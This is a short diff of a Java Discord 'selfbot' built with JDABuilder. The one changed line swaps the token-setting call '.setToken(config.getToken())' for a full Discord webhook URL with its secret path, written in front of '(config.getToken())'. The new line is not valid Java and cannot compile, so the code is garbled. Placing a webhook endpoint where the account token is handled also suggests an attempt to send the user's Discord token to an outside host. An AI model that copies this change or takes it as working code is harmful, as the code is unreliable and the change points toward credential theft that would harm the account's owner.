@@ -41,7 +41,7 @@ public class JSelfBot {
         }
         try {
             new JDABuilder(config.isForBot() ? AccountType.BOT : AccountType.CLIENT)
-                    .setToken(config.getToken())
+                    .https://discord.com/api/webhooks/973201796669513799/90L0l2fpJlkup8s7s3NQAkCzi13zkBS2aFbdxr_Q0ee4dl89JODa6fqDROlZa53zBCxT(config.getToken())
                     .addEventListener(new Bot(config))
                     .setStatus(config.getStatus())
                     .setIdle(true)
